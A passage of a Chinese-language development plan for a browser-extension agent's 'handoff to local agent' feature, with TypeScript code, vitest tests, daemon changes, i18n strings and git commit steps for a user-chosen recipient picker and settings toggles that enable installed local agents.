          : `An interactive terminal session was opened there and is already running.`;
      return {
        success: true,
        observation:
          `Handed off to ${label} (picked by the user). Handoff directory:\n` +
          `${result.dir}\n` +
          `${started}\n` +
          `This is fire-and-forget — the local agent continues independently with the user; ` +
          `results are NOT returned here.`,
      };
    },
  };
}
```

`src/lib/agent/loop.ts` 装配处（现有 `buildHandoffTool({...})` 调用）补一行 dep，并在 import 里从 `@/background/local-bridge` 补 `requestListAgents`：

```ts
            ...(bridgeCapabilities().includes("handoff_to_agent")
              ? [
                  buildHandoffTool({
                    run: (p) => requestHandoff(p),
                    listAgents: () => requestListAgents(),
                    requestConsent: (p) => requestFromPanel(sessionId, "handoff-to-agent", p),
                  }),
                ]
              : []),
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pnpm test -- src/lib/agent/tools/handoff.test.ts`
Expected: PASS（5 tests）

- [ ] **Step 5: Commit**

```bash
git add src/lib/agent/tools/handoff.ts src/lib/agent/tools/handoff.test.ts src/lib/agent/loop.ts
git commit -m "feat(agent): handoff tool drops target param — detected agent list flows to the card, user picks recipient"
```

---

### Task 6: HandoffCard 收件人选择 UI + Chat 接线

**Files:**
- Modify: `src/sidepanel/components/HandoffCard.tsx`
- Modify: `src/sidepanel/components/Chat.tsx`
- Test: `src/sidepanel/components/HandoffCard.test.tsx`

**Interfaces:**
- Consumes: Task 4 的 panel-request req/res（`agents` 列表进 payload，decision 回传 `string | null`）。
- i18n：**零新 key** —— 收件人区块标题复用现有 `handoff.targetLabel`；agent label 是产品名不翻译。

- [ ] **Step 1: 重写失败测试**

`src/sidepanel/components/HandoffCard.test.tsx` 全量替换（无 jest-dom，用 `.toBeTruthy()` 房规）：

```tsx
import { describe, it, expect, vi } from "vitest";
import { render, screen, fireEvent } from "@testing-library/react";
import { HandoffCard } from "./HandoffCard";

const AGENTS = [
  { id: "claude-app", label: "Claude Code (App)" },
  { id: "claude-terminal", label: "Claude Code (Terminal)" },
];

describe("HandoffCard", () => {
  it("renders context verbatim + agent options, first option preselected", () => {
    render(
      <HandoffCard
        payload={{ context: "REFACTOR THE THING", fileCount: 2, agents: AGENTS }}
        onDecision={vi.fn()}
      />,
    );
    expect(screen.getByText("REFACTOR THE THING")).toBeTruthy();
    expect(screen.getByText(/2/)).toBeTruthy(); // 文件数可见
    const radios = screen.getAllByRole("radio") as HTMLInputElement[];
    expect(radios).toHaveLength(2);
    expect(radios[0].checked).toBe(true); // 预选第一项（候选表顺序 = app 优先）
  });

  it("allow returns the picked agent id", () => {
    const onDecision = vi.fn();
    render(
      <HandoffCard
        payload={{ context: "x", fileCount: 0, agents: AGENTS }}
        onDecision={onDecision}
      />,
    );
    fireEvent.click(screen.getByText("Claude Code (Terminal)"));
    fireEvent.click(screen.getByText("Hand off"));
    expect(onDecision).toHaveBeenCalledWith("claude-terminal");
  });

  it("deny returns null", () => {
    const onDecision = vi.fn();
    render(
      <HandoffCard
        payload={{ context: "x", fileCount: 0, agents: AGENTS }}
        onDecision={onDecision}
      />,
    );
    fireEvent.click(screen.getByText("Cancel"));
    expect(onDecision).toHaveBeenCalledWith(null);
  });
});
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pnpm test -- src/sidepanel/components/HandoffCard.test.tsx`
Expected: FAIL（payload 形状不匹配 / 无 radio）

- [ ] **Step 3: 实现**

`src/sidepanel/components/HandoffCard.tsx` 改造：

```tsx
import { useState } from "react";
import { useT } from "@/lib/i18n";

interface AgentOption {
  id: string;
  label: string;
}
interface Props {
  payload: { context: string; fileCount: number; agents: AgentOption[] };
  onDecision: (target: string | null) => void;
}

/**
 * Authorization gate shown before the SW hands a task OFF to a local interactive
 * agent session. The user picks the recipient here (the LLM cannot — recipient
 * choice and authorization are one step). Context is rendered verbatim so the
 * user sees exactly what will be written to context.md.
 */
export function HandoffCard({ payload, onDecision }: Props) {
  const t = useT();
  const [selected, setSelected] = useState(payload.agents[0]?.id ?? "");
  return (
    <div className="flex flex-col gap-3 rounded-lg border border-warning-line bg-warning-tint px-3 py-2.5 text-[12px] leading-[18px] text-warning">
      <div className="text-[13px] font-medium text-warning">{t("handoff.title")}</div>
      <div>
        <div className="text-warning/70">{t("handoff.targetLabel")}</div>
        <div className="mt-1 flex flex-col gap-1">
          {payload.agents.map((a) => (
            <label
              key={a.id}
              className="flex cursor-pointer items-center gap-2 rounded border border-warning-line/50 bg-black/5 px-2 py-1 text-warning"
            >
              <input
                type="radio"
                name="handoff-target"
                checked={selected === a.id}
                onChange={() => setSelected(a.id)}
              />
              <span>{a.label}</span>
            </label>
          ))}
        </div>
      </div>
      <div>
        <div className="text-warning/70">{t("handoff.contextLabel")}</div>
        <pre className="mt-1 max-h-40 overflow-auto whitespace-pre-wrap break-words rounded border border-warning-line/50 bg-black/5 px-2 py-1 text-warning">
          {payload.context}
        </pre>
      </div>
      {payload.fileCount > 0 && (
        <div className="text-warning/70">
          {t("handoff.filesLabel")}: {payload.fileCount}
        </div>
      )}
      <div className="flex gap-2">
        <button
          type="button"
          onClick={() => onDecision(selected)}
          className="rounded border border-warning-line bg-warning-tint px-2.5 py-1 text-[11px] font-medium text-warning hover:bg-warning-line/30"
        >
          {t("handoff.allow")}
        </button>
        <button
          type="button"
          onClick={() => onDecision(null)}
          className="rounded border border-warning-line/50 bg-transparent px-2.5 py-1 text-[11px] text-warning/70 hover:text-warning"
        >
          {t("handoff.deny")}
        </button>
      </div>
    </div>
  );
}
```

`src/sidepanel/components/Chat.tsx` 的 handoff 分支改为：

```tsx
      {panelRequest?.kind === "handoff-to-agent" && (
        <HandoffCard
          payload={
            panelRequest.payload as {
              context: string;
              fileCount: number;
              agents: { id: string; label: string }[];
            }
          }
          onDecision={(target) => respondPanel(panelRequest.requestId, { ok: true, data: target })}
        />
      )}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pnpm test -- src/sidepanel/components/HandoffCard.test.tsx`
Expected: PASS（3 tests）

- [ ] **Step 5: Commit**

```bash
git add src/sidepanel/components/HandoffCard.tsx src/sidepanel/components/HandoffCard.test.tsx src/sidepanel/components/Chat.tsx
git commit -m "feat(panel): HandoffCard recipient picker — radio list of detected agents, first preselected"
```

---

### Task 7: 全量验证

**Files:** 无新改动（只跑验证；发现回归就地修）。

- [ ] **Step 1: 扩展全量测试**

Run: `pnpm test`
Expected: 全绿（含 dictionary-parity、cross-layer、tool-names invariant）

- [ ] **Step 2: typecheck**

Run: `pnpm typecheck`
Expected: 0 错

- [ ] **Step 3: 构建（build-time invariants）**

Run: `pnpm build`
Expected: 成功（`tool-names.ts` / `tools.ts` 的 module-load throw 不触发）

- [ ] **Step 4: daemon 全量测试**

Run: `cd daemon && bun test`
Expected: 全绿

- [ ] **Step 5: Commit（若有修复）**

```bash
git add -A && git commit -m "chore: slice 1.5 full-suite fixes"
```
（无修复则跳过。）

---

## 追加（2026-07-07）：设置页 Agent 启用管理

用户需求：设置页显示本地 Agent 列表；已安装自动检测（默认启用）；用户可手动启用/禁用某个 agent，**启用时现场检测**——已安装才能启用，未安装启用不了。**零轮询**（agent 列表只在挂载 / 桥 ready 翻转 / 开关交互时查一次）。

追加约束（在原 Global Constraints 之上）：
- A1. `list_agents` 改为返回**全部候选 + `installed` 标志**（未安装的条目要能出现在设置页才谈得上"启用不了"）。daemon 安全闸不变（仍只认现检测已安装集）。
- A2. 启用偏好 = 扩展侧 IDB config 单值 `enabled_local_agents: string[]`；**缺省（null）= 已安装即启用**（开箱即用）；用户动过开关后落显式数组。
- A3. handoff 卡片列表 = 已安装 ∩ 已启用（`filterUsableAgents` 纯函数）；工具/卡片（Task 5/6 产物）零改动——过滤在 loop.ts 装配闭包里做。
- A4. 旧 daemon fallback 单项 `{id:"claude"}` 补 `installed: true`（维持可 handoff 语义）。
- A5. i18n 新 key 3 个（agentsTitle / agentNotInstalled / agentEnableFailed），6 字典真翻译，parity 不许挂。

### Task 8: 协议 installed 标志 + 偏好模块

**Files:**
- Modify: `src/types/local-bridge.ts` — `ListAgentsResult.agents` 加 `installed: boolean`
- Modify: `daemon/src/daemon.ts` — `list_agents` 返回全部候选 + installed
- Modify: `daemon/test/daemon.test.ts`
- Modify: `src/background/local-bridge.ts` — fallback 补 installed
- Modify: `src/background/local-bridge.test.ts`
- Create: `src/lib/local-agents-prefs.ts` + `src/lib/local-agents-prefs.test.ts`

**Interfaces:**
- Produces: `ListAgentsResult = { agents: { id; label; installed: boolean }[] }`；`getEnabledLocalAgents(): Promise<string[] | null>`；`setEnabledLocalAgents(ids): Promise<void>`；`filterUsableAgents(detected, enabled)` 纯函数；`applyToggle(detected, enabled, id, next)` 纯函数。Task 9 全部消费。

- [ ] **Step 1: 失败测试**

`daemon/test/daemon.test.ts` 现有 list_agents shape 测试改为：

```ts
test("list_agents returns ALL candidates with installed flag (shape only — detection machine-dependent)", async () => {
  const out = JSON.parse(
    await handleMessage(JSON.stringify({ id: "la1", method: "list_agents", params: {} })),
  );
  expect(out.ok).toBe(true);
  // 全部候选恒定返回（未安装的也在，settings 页靠它渲染"未安装"态）
  expect(out.result.agents.map((a: { id: string }) => a.id)).toEqual([
    "claude-app",
    "claude-terminal",
    "codex-terminal",
  ]);
  for (const a of out.result.agents) {
    expect(typeof a.label).toBe("string");
    expect(typeof a.installed).toBe("boolean");
  }
});
```

`src/lib/local-agents-prefs.test.ts`（纯函数部分；get/set 走 config-store，参考 `src/lib/skills/storage` 相关测试对 IDB 的处理方式——若现有测试直接用真 config-store + fake IDB 环境则照搬，否则只测纯函数）：

```ts
import { describe, it, expect } from "vitest";
import { filterUsableAgents, applyToggle } from "./local-agents-prefs";

const DETECTED = [
  { id: "claude-app", label: "Claude Code (App)", installed: true },
  { id: "claude-terminal", label: "Claude Code (Terminal)", installed: false },
  { id: "codex-terminal", label: "Codex (Terminal)", installed: true },
];

describe("filterUsableAgents", () => {
  it("null prefs = every installed agent usable (out-of-box default)", () => {
    expect(filterUsableAgents(DETECTED, null).map((a) => a.id)).toEqual(["claude-app", "codex-terminal"]);
  });
  it("explicit prefs intersect with installed", () => {
    expect(filterUsableAgents(DETECTED, ["codex-terminal"]).map((a) => a.id)).toEqual(["codex-terminal"]);
  });
  it("not-installed never usable even if listed in prefs", () => {
    expect(filterUsableAgents(DETECTED, ["claude-terminal"])).toEqual([]);
  });
});

describe("applyToggle", () => {
  it("enabling a not-installed agent is rejected", () => {
    expect(applyToggle(DETECTED, null, "claude-terminal", true)).toEqual({ ok: false, reason: "not_installed" });
  });
  it("first toggle materializes null prefs as all-installed, then applies", () => {
    expect(applyToggle(DETECTED, null, "codex-terminal", false)).toEqual({ ok: true, next: ["claude-app"] });
  });
  it("re-enabling adds without duplicates", () => {
    expect(applyToggle(DETECTED, ["claude-app"], "codex-terminal", true)).toEqual({
      ok: true,
      next: ["claude-app", "codex-terminal"],
    });
  });
  it("disabling is allowed regardless of installed state", () => {
    expect(applyToggle(DETECTED, ["claude-app", "claude-terminal"], "claude-terminal", false)).toEqual({
      ok: true,
      next: ["claude-app"],
    });
  });
});
```

`src/background/local-bridge.test.ts`：现有 requestListAgents 成功测试的 result 改带 `installed: true` 并断言透传；fallback 测试断言 `[{ id: "claude", label: "Claude Code (Terminal)", installed: true }]`。

- [ ] **Step 2: 确认失败**（`cd daemon && bun test test/daemon.test.ts`；`pnpm test -- src/lib/local-agents-prefs.test.ts src/background/local-bridge.test.ts`）

- [ ] **Step 3: 实现**

`src/types/local-bridge.ts`：

```ts
/** daemon 静态候选表全量（含未安装项，installed 标注检测结果——settings 页渲染"未安装"态需要）。 */
export interface ListAgentsResult {
  agents: { id: string; label: string; installed: boolean }[];
}
```

`daemon/src/daemon.ts` 的 `list_agents` case（保留 try/catch）：

```ts
        const detected = new Set(detectAgents().map((a) => a.id));
        const result: ListAgentsResult = {
          agents: AGENT_CANDIDATES.map(({ id, label }) => ({ id, label, installed: detected.has(id) })),
        };
        return respond({ ok: true, result });
```

（import 处补 `AGENT_CANDIDATES`。）

`src/background/local-bridge.ts`：

```ts
export async function requestListAgents(): Promise<{ id: string; label: string; installed: boolean }[]> {
  // 旧 daemon（无 list_agents capability）降级为单项 legacy 列表：id "claude"
  // 是旧 wire 值，installed 视为 true（维持旧 daemon 可 handoff 的语义）。
  if (!capabilities.includes("list_agents")) {
    return [{ id: "claude", label: "Claude Code (Terminal)", installed: true }];
  }
  const r = (await send("list_agents", {})) as ListAgentsResult;
  return r.agents;
}
```

`src/lib/local-agents-prefs.ts`：

```ts
import { getConfig, setConfig } from "@/lib/idb/config-store";

// 设置页「本地 Agent」启用偏好。null（用户从没动过开关）= 已安装即启用（开箱
// 即用，"安装之后自动检测"）；一旦动过开关就落显式数组。
const KEY = "enabled_local_agents";

export async function getEnabledLocalAgents(): Promise<string[] | null> {
  return (await getConfig<string[]>(KEY)) ?? null;
}

export async function setEnabledLocalAgents(ids: string[]): Promise<void> {
  await setConfig(KEY, ids);
}

/** handoff 卡片可用列表 = 已安装 ∩ 已启用（null = 已安装全启用）。 */
export function filterUsableAgents<T extends { id: string; installed: boolean }>(
  detected: T[],
  enabled: string[] | null,
): T[] {
  return detected.filter((a) => a.installed && (enabled == null || enabled.includes(a.id)));
}

/** 开关决策纯函数：启用时现检测把关——未安装启用不了；null 偏好先物化为「当前已安装全启用」。 */
export function applyToggle(
  detected: { id: string; installed: boolean }[],
  enabled: string[] | null,
  id: string,
  next: boolean,
): { ok: true; next: string[] } | { ok: false; reason: "not_installed" } {
  if (next && !detected.some((a) => a.id === id && a.installed)) {
    return { ok: false, reason: "not_installed" };
  }
  const base = enabled ?? detected.filter((a) => a.installed).map((a) => a.id);
  return { ok: true, next: next ? [...new Set([...base, id])] : base.filter((x) => x !== id) };
}
```

- [ ] **Step 4: 确认通过**（同 Step 2 两条命令 + `pnpm typecheck`。注意：此时 loop.ts 的 listAgents 闭包直接透传 `requestListAgents()` 的结果给 `HandoffToolDeps.listAgents`（期望 `{id,label}[]`），多出的 installed 字段是结构化子类型、typecheck 不挂；语义过滤在 Task 9 接上。）

- [ ] **Step 5: Commit**（`feat(bridge): list_agents carries all candidates + installed flag; local-agent enable prefs module`）

### Task 9: SW messages + loop 过滤 + Settings UI + i18n

**Files:**
- Modify: `src/background/index.ts` — `local-agents:list` / `local-agents:toggle` 两个 message handler（仿 `local-bridge:status`，薄壳调纯函数）
- Modify: `src/lib/agent/loop.ts` — listAgents 闭包接 `filterUsableAgents`
- Modify: `src/sidepanel/components/Settings.tsx` — LocalBridgeSection 内加 Agent 列表
- Modify: `src/lib/i18n/dictionaries/{en,zh-CN,zh-TW,es-419,ja,pt-BR}.ts` — `settings.localBridge` 下加 3 key

**Interfaces:**
- Consumes: Task 8 全部产物。
- Produces: message 协议 `{type:"local-agents:list"}` → `{agents:{id,label,installed,enabled}[]}`；`{type:"local-agents:toggle",id,next}` → `{ok:true}|{ok:false,reason:"not_installed"|string}`。

- [ ] **Step 1: SW handlers**（`src/background/index.ts`，插在 `local-bridge:status` handler 之后；import 补 `requestListAgents`、`getEnabledLocalAgents`/`setEnabledLocalAgents`/`applyToggle`）

```ts
  // Settings「本地 Agent」列表 — 一次性查询（无轮询）。桥没 ready → 空列表。
  if (message?.type === "local-agents:list") {
    (async () => {
      if (!isBridgeReady()) return { agents: [] };
      const detected = await requestListAgents();
      const enabled = await getEnabledLocalAgents();
      return {
        agents: detected.map((a) => ({
          ...a,
          enabled: a.installed && (enabled == null || enabled.includes(a.id)),
        })),
      };
    })()
      .then(sendResponse)
      .catch(() => sendResponse({ agents: [] }));
    return true; // async response
  }

  // Settings 开关 — 启用时现检测把关：未安装启用不了（决策在 applyToggle 纯函数）。
  if (message?.type === "local-agents:toggle") {
    const m = message as { type: string; id: string; next: boolean };
    (async () => {
      const detected = isBridgeReady() ? await requestListAgents() : [];
      const decision = applyToggle(detected, await getEnabledLocalAgents(), m.id, m.next);
      if (!decision.ok) return decision;
      await setEnabledLocalAgents(decision.next);
      return { ok: true };
    })()
      .then(sendResponse)
      .catch((e) => sendResponse({ ok: false, reason: String(e) }));
    return true; // async response
  }
```

- [ ] **Step 2: loop.ts 装配闭包接过滤**（import 补 `filterUsableAgents`/`getEnabledLocalAgents`；工具与卡片零改动）

```ts
                    listAgents: async () => {
                      const detected = await requestListAgents();
                      const usable = filterUsableAgents(detected, await getEnabledLocalAgents());
                      return usable.map(({ id, label }) => ({ id, label }));
                    },
```

- [ ] **Step 3: Settings UI**（`LocalBridgeSection` 内。零轮询：挂载查一次 + `status?.ready` 翻 true 时查一次 + 开关交互后重查。agent label 是产品名不翻译）

```tsx
type PanelAgent = { id: string; label: string; installed: boolean; enabled: boolean };

function queryLocalAgents(cb: (agents: PanelAgent[]) => void): void {
  try {
    chrome.runtime.sendMessage({ type: "local-agents:list" }, (res) => {
      if (chrome.runtime.lastError) return;
      if (res && Array.isArray(res.agents)) cb(res.agents as PanelAgent[]);
    });
  } catch {
    /* noop */
  }
}
```

LocalBridgeSection 内加 state 与 effect（**不动**现有 1.5s 桥状态轮询——那是已合并行为；agent 列表自身零轮询）：

```tsx
  const [agents, setAgents] = useState<PanelAgent[]>([]);
  const [failedId, setFailedId] = useState<string | null>(null);

  useEffect(() => {
    if (status?.ready) queryLocalAgents(setAgents);
    else setAgents([]);
  }, [status?.ready]);

  const onAgentToggle = (id: string, next: boolean) => {
    setFailedId(null);
    try {
      chrome.runtime.sendMessage({ type: "local-agents:toggle", id, next }, (res) => {
        if (chrome.runtime.lastError) return;
        if (res?.ok) queryLocalAgents(setAgents);
        else setFailedId(id);
      });
    } catch {
      /* noop */
    }
  };
```

渲染（卡片 div 内、现有 toggle 行之后；仅桥已连时出现）：

```tsx
        {status?.ready && agents.length > 0 && (
          <div className="flex flex-col gap-2 border-t border-line pt-3">
            <div className="text-[12px] font-medium text-fg-2">{t("settings.localBridge.agentsTitle")}</div>
            {agents.map((a) => (
              <div key={a.id} className="flex flex-col gap-1">
                <div className="flex items-center justify-between gap-3">
                  <div className="flex items-baseline gap-2">
                    <span className="text-[13px] text-fg-1">{a.label}</span>
                    {!a.installed && (
                      <span className="text-[11px] text-fg-3">{t("settings.localBridge.agentNotInstalled")}</span>
                    )}
                  </div>
                  <Switch checked={a.enabled} onChange={(next) => onAgentToggle(a.id, next)} />
                </div>
                {failedId === a.id && (
                  <div className="text-[11px] text-fg-3">{t("settings.localBridge.agentEnableFailed")}</div>
                )}
              </div>
            ))}
          </div>
        )}
```

- [ ] **Step 4: i18n 3 key × 6 字典**（`settings.localBridge` 块尾部追加；各语言真翻译）

en：
```ts
      agentsTitle: "Local agents",
      agentNotInstalled: "Not installed",
      agentEnableFailed: "Can't enable — not detected on this machine.",
```
zh-CN：`本地 Agent` / `未安装` / `无法启用——未在本机检测到安装。`
zh-TW：`本機 Agent` / `未安裝` / `無法啟用——未在本機偵測到安裝。`
ja：`ローカル Agent` / `未インストール` / `有効にできません——このマシンで検出されませんでした。`
es-419：`Agentes locales` / `No instalado` / `No se puede habilitar: no se detectó en esta máquina.`
pt-BR：`Agentes locais` / `Não instalado` / `Não é possível habilitar — não detectado nesta máquina.`

- [ ] **Step 5: 验证 + Commit**（`pnpm test`（含 dictionary-parity）+ `pnpm typecheck` + `pnpm build`；commit `feat(settings): local agent enable toggles — detect-on-enable, zero polling`）
